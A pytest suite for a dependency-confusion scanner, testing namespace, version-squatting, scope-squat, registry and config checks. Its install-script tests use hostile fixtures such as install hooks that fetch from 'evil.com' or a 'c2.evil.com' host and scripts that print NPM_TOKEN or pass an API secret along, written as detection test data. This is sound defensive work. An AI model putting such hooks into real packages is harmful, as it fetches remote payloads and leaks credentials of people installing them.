"""Comprehensive tests for the enhanced dependency confusion scanner."""

from __future__ import annotations

import json
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from depfence.core.models import FindingType, PackageId, PackageMeta, Severity
from depfence.scanners.depconfusion import (
    DepConfusionScanner,
    _load_org_prefixes,
    _minimal_yaml_load,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _meta(ecosystem: str, name: str, version: str | None = None) -> PackageMeta:
    return PackageMeta(pkg=PackageId(ecosystem=ecosystem, name=name, version=version))


def _scanner(**kwargs) -> DepConfusionScanner:
    return DepConfusionScanner(**kwargs)


# ---------------------------------------------------------------------------
# Original tests (backward-compat)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_extra_index_url_flagged():
    s = _scanner()
    with tempfile.TemporaryDirectory() as d:
        pyproject = Path(d) / "pyproject.toml"
        pyproject.write_text('[tool.uv]\nextra-index-url = "https://private.corp/simple"\n')
        findings = await s.scan_project_configs(Path(d))
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "dependency confusion" in findings[0].title.lower()


@pytest.mark.asyncio
async def test_npmrc_no_always_auth():
    s = _scanner()
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / ".npmrc").write_text("registry=https://private.corp/npm/\n")
        findings = await s.scan_project_configs(Path(d))
        assert any(f.severity == Severity.MEDIUM for f in findings)


@pytest.mark.asyncio
async def test_npmrc_with_always_auth_clean():
    s = _scanner()
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / ".npmrc").write_text("registry=https://private.corp/npm/\nalways-auth=true\n")
        findings = await s.scan_project_configs(Path(d))
        # No medium/high npmrc findings
        npmrc_medium = [f for f in findings if "always-auth" in f.detail]
        assert npmrc_medium == []


@pytest.mark.asyncio
async def test_no_config_clean():
    s = _scanner()
    with tempfile.TemporaryDirectory() as d:
        findings = await s.scan_project_configs(Path(d))
        assert findings == []


# ---------------------------------------------------------------------------
# Namespace analysis
# ---------------------------------------------------------------------------

class TestNamespaceAnalysis:

    def test_configured_prefix_flagged(self):
        s = _scanner(org_prefixes=["acme"])
        pkg = PackageId(ecosystem="npm", name="acme-utils")
        findings = s._check_namespace(pkg)
        assert any(f.finding_type == FindingType.DEP_CONFUSION for f in findings)
        assert any("acme" in f.title for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_configured_prefix_underscore(self):
        s = _scanner(org_prefixes=["myco"])
        pkg = PackageId(ecosystem="npm", name="myco_auth")
        findings = s._check_namespace(pkg)
        assert any("myco" in f.title for f in findings)

    def test_non_matching_prefix_clean(self):
        s = _scanner(org_prefixes=["acme"])
        pkg = PackageId(ecosystem="npm", name="lodash")
        findings = s._check_namespace(pkg)
        assert findings == []

    def test_internal_keyword_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="company-internal-sdk")
        findings = s._check_namespace(pkg)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_private_keyword_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="pypi", name="acme-private-utils")
        findings = s._check_namespace(pkg)
        assert any(f.finding_type == FindingType.DEP_CONFUSION for f in findings)

    def test_corp_keyword_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="corp-auth-service")
        findings = s._check_namespace(pkg)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_scoped_package_bare_name_checked(self):
        """Namespace check uses bare name, not scope prefix."""
        s = _scanner(org_prefixes=["acme"])
        # @acme/utils — bare is "utils", prefix "acme" — NOT a match (prefix on bare name)
        pkg = PackageId(ecosystem="npm", name="@acme/utils")
        findings = s._check_namespace(pkg)
        # Should NOT fire the org_prefix check because bare "utils" doesn't start with "acme-"
        prefix_findings = [f for f in findings if "acme" in f.title and "prefix" in f.title]
        assert prefix_findings == []

    def test_unscoped_org_prefix_heuristic_low(self):
        s = _scanner()
        # "facebook-auth" — looks like it should be @facebook/auth
        pkg = PackageId(ecosystem="npm", name="facebook-auth")
        findings = s._check_namespace(pkg)
        low = [f for f in findings if f.severity == Severity.LOW and f.finding_type == FindingType.DEP_CONFUSION]
        assert len(low) == 1
        assert "facebook" in low[0].detail

    def test_well_known_package_no_heuristic(self):
        """Common packages like 'express' or 'lodash' should not trigger heuristic."""
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="lodash")
        findings = s._check_namespace(pkg)
        low = [f for f in findings if f.severity == Severity.LOW]
        assert low == []

    def test_multiple_prefixes_all_checked(self):
        s = _scanner(org_prefixes=["acme", "corpx"])
        findings_acme = s._check_namespace(PackageId(ecosystem="npm", name="acme-sdk"))
        findings_corp = s._check_namespace(PackageId(ecosystem="npm", name="corpx-deploy"))
        assert findings_acme
        assert findings_corp

    def test_pypi_internal_pattern(self):
        s = _scanner()
        pkg = PackageId(ecosystem="pypi", name="mycompany-infra-tools")
        findings = s._check_namespace(pkg)
        assert any(f.finding_type == FindingType.DEP_CONFUSION for f in findings)


# ---------------------------------------------------------------------------
# Version anomaly detection
# ---------------------------------------------------------------------------

class TestVersionAnomalyDetection:

    def test_999_squatter_pattern_critical(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="acme-utils", version="999.0.0")
        findings = s._check_version_anomaly(pkg)
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].finding_type == FindingType.DEP_CONFUSION
        assert "999" in findings[0].title

    def test_9999_squatter_pattern_critical(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="pkg", version="9999.1.0")
        findings = s._check_version_anomaly(pkg)
        assert findings[0].severity == Severity.CRITICAL

    def test_high_version_100_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="some-pkg", version="100.0.1")
        findings = s._check_version_anomaly(pkg)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    def test_high_version_200_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="pypi", name="requests", version="200.3.1")
        findings = s._check_version_anomaly(pkg)
        assert findings[0].severity == Severity.HIGH

    def test_normal_version_clean(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="lodash", version="4.17.21")
        findings = s._check_version_anomaly(pkg)
        assert findings == []

    def test_version_99_not_flagged(self):
        """Major 99 is below the 100-threshold."""
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="pkg", version="99.0.0")
        findings = s._check_version_anomaly(pkg)
        assert findings == []

    def test_no_version_no_findings(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="pkg", version=None)
        findings = s._check_version_anomaly(pkg)
        assert findings == []

    def test_squatter_takes_priority_over_high(self):
        """999.x.x should produce exactly one CRITICAL, not also a HIGH."""
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="pkg", version="999.99.99")
        findings = s._check_version_anomaly(pkg)
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL


# ---------------------------------------------------------------------------
# npm scope validation (offline)
# ---------------------------------------------------------------------------

class TestNpmScopeOffline:

    def test_wrong_scope_for_react_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@notfacebook/react")
        findings = s._check_npm_scope_offline(pkg)
        assert any(f.finding_type == FindingType.SCOPE_SQUAT for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_correct_scope_for_react_clean(self):
        """@facebook/react is the legitimate scope — should not fire."""
        # @facebook/react is NOT in the _KNOWN_SCOPES map (react -> facebook means
        # if scope != facebook then flag). So facebook IS the legitimate scope.
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@facebook/react")
        findings = s._check_npm_scope_offline(pkg)
        scope_squat = [f for f in findings if f.finding_type == FindingType.SCOPE_SQUAT]
        assert scope_squat == []

    def test_wrong_scope_for_babel_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@evil/babel")
        findings = s._check_npm_scope_offline(pkg)
        assert any(f.finding_type == FindingType.SCOPE_SQUAT for f in findings)

    def test_correct_scope_for_babel_clean(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@babel/core")
        findings = s._check_npm_scope_offline(pkg)
        scope_squat = [f for f in findings if f.finding_type == FindingType.SCOPE_SQUAT]
        assert scope_squat == []

    def test_unknown_package_scope_not_flagged(self):
        """Unknown package bare names don't trigger scope-squat."""
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@anyscope/unknown-pkg")
        findings = s._check_npm_scope_offline(pkg)
        scope_squat = [f for f in findings if f.finding_type == FindingType.SCOPE_SQUAT]
        assert scope_squat == []

    def test_unscoped_npm_not_checked_offline(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="react")
        findings = s._check_npm_scope_offline(pkg)
        assert findings == []


# ---------------------------------------------------------------------------
# Registry cross-check (mocked HTTP)
# ---------------------------------------------------------------------------

class TestRegistryCrossCheck:

    @pytest.mark.asyncio
    async def test_404_on_public_registry_flagged(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@myorg/private-lib")
        mock_resp = MagicMock()
        mock_resp.status_code = 404

        with patch("httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(return_value=mock_resp)
            mock_client_cls.return_value = mock_client

            finding = await s._check_npm_scope_online(pkg)

        assert finding is not None
        assert finding.finding_type == FindingType.DEP_CONFUSION
        assert finding.severity == Severity.HIGH

    @pytest.mark.asyncio
    async def test_200_on_public_registry_clean(self):
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@myorg/public-lib")
        mock_resp = MagicMock()
        mock_resp.status_code = 200

        with patch("httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(return_value=mock_resp)
            mock_client_cls.return_value = mock_client

            finding = await s._check_npm_scope_online(pkg)

        assert finding is None

    @pytest.mark.asyncio
    async def test_http_error_returns_none(self):
        import httpx as _httpx
        s = _scanner()
        pkg = PackageId(ecosystem="npm", name="@myorg/some-lib")

        with patch("httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(side_effect=_httpx.ConnectError("timeout"))
            mock_client_cls.return_value = mock_client

            finding = await s._check_npm_scope_online(pkg)

        assert finding is None


# ---------------------------------------------------------------------------
# Install script analysis
# ---------------------------------------------------------------------------

class TestInstallScriptAnalysis:

    def _write_pkg_json(self, d: str, scripts: dict) -> Path:
        p = Path(d) / "package.json"
        p.write_text(json.dumps({"name": "test-pkg", "scripts": scripts}))
        return p

    def test_curl_in_postinstall_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"postinstall": "curl https://example.com/setup.sh"})
            findings = s._check_package_json_scripts(p)
            network = [f for f in findings if "Network" in f.title]
            assert len(network) >= 1
            assert network[0].severity == Severity.HIGH

    def test_wget_in_preinstall_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"preinstall": "wget -q https://evil.com/payload"})
            findings = s._check_package_json_scripts(p)
            assert any("Network" in f.title for f in findings)

    def test_env_token_access_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"postinstall": "node -e \"console.log(process.env.NPM_TOKEN)\""})
            findings = s._check_package_json_scripts(p)
            env_findings = [f for f in findings if "env" in f.title.lower() or "Sensitive" in f.title]
            assert len(env_findings) >= 1

    def test_env_secret_access_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"postinstall": "node send.js $MY_API_SECRET"})
            findings = s._check_package_json_scripts(p)
            env_findings = [f for f in findings if "Sensitive" in f.title or "env" in f.title.lower()]
            assert len(env_findings) >= 1

    def test_exec_spawn_without_network_medium(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"postinstall": "node -e \"require('child_process').execSync('id')\""})
            findings = s._check_package_json_scripts(p)
            medium = [f for f in findings if f.severity == Severity.MEDIUM]
            assert len(medium) >= 1

    def test_clean_script_not_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = self._write_pkg_json(d, {"postinstall": "echo 'Build complete'"})
            findings = s._check_package_json_scripts(p)
            assert findings == []

    def test_all_lifecycle_hooks_checked(self):
        """All five monitored hooks are individually checked."""
        s = _scanner()
        for hook in ("preinstall", "postinstall", "install", "prepare", "prepack"):
            with tempfile.TemporaryDirectory() as d:
                p = self._write_pkg_json(d, {hook: "curl https://c2.evil.com/"})
                findings = s._check_package_json_scripts(p)
                assert any(hook in f.metadata.get("hook", "") for f in findings), \
                    f"Hook '{hook}' not detected"

    def test_invalid_json_returns_empty(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "package.json"
            p.write_text("{not valid json")
            findings = s._check_package_json_scripts(p)
            assert findings == []


# ---------------------------------------------------------------------------
# .npmrc scope gap detection
# ---------------------------------------------------------------------------

class TestNpmrcScopeGaps:

    def test_scope_with_registry_no_gap(self):
        content = "@myorg:registry=https://private.corp/npm/\n"
        gaps = DepConfusionScanner._check_npmrc_scope_gaps(content)
        assert "@myorg" not in gaps

    def test_scope_config_without_registry_is_gap(self):
        content = "@myorg:always-auth=true\n"
        gaps = DepConfusionScanner._check_npmrc_scope_gaps(content)
        assert "@myorg" in gaps

    def test_scope_with_both_registry_and_config_no_gap(self):
        content = (
            "@myorg:registry=https://private.corp/npm/\n"
            "@myorg:always-auth=true\n"
        )
        gaps = DepConfusionScanner._check_npmrc_scope_gaps(content)
        assert "@myorg" not in gaps

    def test_empty_npmrc_no_gaps(self):
        gaps = DepConfusionScanner._check_npmrc_scope_gaps("")
        assert gaps == []

    @pytest.mark.asyncio
    async def test_scan_project_configs_scope_gap_reported(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / ".npmrc").write_text(
                "registry=https://private.corp/npm/\nalways-auth=true\n"
                "@myorg:always-auth=true\n"
            )
            findings = await s.scan_project_configs(Path(d))
            gap_findings = [f for f in findings if "scope_gap" in str(f.metadata.get("check", ""))]
            assert len(gap_findings) == 1
            assert "@myorg" in gap_findings[0].title


# ---------------------------------------------------------------------------
# pip.conf detection
# ---------------------------------------------------------------------------

class TestPipConfDetection:

    @pytest.mark.asyncio
    async def test_pip_conf_extra_index_flagged(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "pip.conf").write_text(
                "[global]\nextra-index-url = https://private.corp/simple\n"
            )
            findings = await s.scan_project_configs(Path(d))
            assert any("pip.conf" in f.title for f in findings)
            assert any(f.severity == Severity.HIGH for f in findings)

    @pytest.mark.asyncio
    async def test_pip_conf_no_extra_index_clean(self):
        s = _scanner()
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "pip.conf").write_text(
                "[global]\nindex-url = https://pypi.org/simple\n"
            )
            findings = await s.scan_project_configs(Path(d))
            pip_findings = [f for f in findings if "pip.conf" in f.title]
            assert pip_findings == []


# ---------------------------------------------------------------------------
# Config file loading (depfence.yml)
# ---------------------------------------------------------------------------

class TestConfigLoading:

    def test_load_prefixes_from_depfence_yml(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "depfence.yml"
            cfg.write_text(
                "dep_confusion:\n"
                "  internal_prefixes:\n"
                "    - acme\n"
                "    - mycompany\n"
            )
            prefixes = _load_org_prefixes(Path(d))
        assert "acme" in prefixes
        assert "mycompany" in prefixes

    def test_no_depfence_yml_returns_empty(self):
        with tempfile.TemporaryDirectory() as d:
            prefixes = _load_org_prefixes(Path(d))
        assert prefixes == []

    def test_project_dir_none_returns_empty(self):
        prefixes = _load_org_prefixes(None)
        assert prefixes == []

    def test_scanner_loads_prefixes_from_project_dir(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "depfence.yml"
            cfg.write_text(
                "dep_confusion:\n"
                "  internal_prefixes:\n"
                "    - corp\n"
            )
            s = DepConfusionScanner(project_dir=Path(d))
        assert "corp" in s._org_prefixes

    def test_constructor_and_file_prefixes_merged(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "depfence.yml"
            cfg.write_text(
                "dep_confusion:\n"
                "  internal_prefixes:\n"
                "    - filecorp\n"
            )
            s = DepConfusionScanner(org_prefixes=["ctorcorp"], project_dir=Path(d))
        assert "ctorcorp" in s._org_prefixes
        assert "filecorp" in s._org_prefixes

    def test_malformed_yml_returns_empty(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "depfence.yml"
            cfg.write_text(":::invalid:::\n")
            prefixes = _load_org_prefixes(Path(d))
        assert isinstance(prefixes, list)

    def test_minimal_yaml_load_basic(self):
        text = "dep_confusion:\n  internal_prefixes:\n    - acme\n    - corp\n"
        result = _minimal_yaml_load(text)
        assert "dep_confusion" in result

    def test_prefixes_lowercased(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "depfence.yml"
            cfg.write_text(
                "dep_confusion:\n"
                "  internal_prefixes:\n"
                "    - ACME\n"
                "    - MyCorp\n"
            )
            s = DepConfusionScanner(project_dir=Path(d))
        assert "acme" in s._org_prefixes
        assert "mycorp" in s._org_prefixes


# ---------------------------------------------------------------------------
# Full scan() integration (offline paths only)
# ---------------------------------------------------------------------------

class TestFullScan:

    @pytest.mark.asyncio
    async def test_scan_internal_keyword_package(self):
        s = _scanner()
        metas = [_meta("npm", "company-internal-auth", "1.0.0")]
        findings = await s.scan(metas)
        assert any(f.finding_type == FindingType.DEP_CONFUSION for f in findings)

    @pytest.mark.asyncio
    async def test_scan_999_version_critical(self):
        s = _scanner()
        metas = [_meta("npm", "some-pkg", "999.0.0")]
        # Mock out the online check (scoped packages only)
        findings = await s.scan(metas)
        crit = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(crit) >= 1

    @pytest.mark.asyncio
    async def test_scan_benign_package_no_findings(self):
        s = _scanner()
        metas = [_meta("npm", "lodash", "4.17.21")]
        findings = await s.scan(metas)
        assert findings == []

    @pytest.mark.asyncio
    async def test_scan_pypi_private_name(self):
        s = _scanner()
        metas = [_meta("pypi", "acme-private-client", "2.0.0")]
        findings = await s.scan(metas)
        assert any(f.finding_type == FindingType.DEP_CONFUSION for f in findings)

    @pytest.mark.asyncio
    async def test_scan_with_configured_prefix(self):
        s = _scanner(org_prefixes=["widgetco"])
        metas = [_meta("npm", "widgetco-deploy", "1.2.3")]
        findings = await s.scan(metas)
        high = [f for f in findings if f.severity == Severity.HIGH and "widgetco" in f.title]
        assert len(high) >= 1

    @pytest.mark.asyncio
    async def test_scan_scope_squat_flagged(self):
        s = _scanner()
        # @notbabel/babel should trigger scope-squat since babel -> @babel
        metas = [_meta("npm", "@notbabel/babel", "7.0.0")]
        findings = await s.scan(metas)
        squat = [f for f in findings if f.finding_type == FindingType.SCOPE_SQUAT]
        assert len(squat) >= 1

    @pytest.mark.asyncio
    async def test_scan_multiple_packages(self):
        s = _scanner(org_prefixes=["corp"])
        metas = [
            _meta("npm", "corp-auth", "1.0.0"),
            _meta("npm", "lodash", "4.17.21"),
            _meta("npm", "some-pkg", "999.0.0"),
        ]
        findings = await s.scan(metas)
        # corp-auth -> HIGH prefix match
        # lodash -> clean
        # 999.0.0 -> CRITICAL version
        assert any(f.severity == Severity.CRITICAL for f in findings)
        assert any("corp" in f.title for f in findings)
        # lodash should not appear in findings
        pkg_names = {str(f.package) for f in findings}
        assert not any("lodash" in n for n in pkg_names)
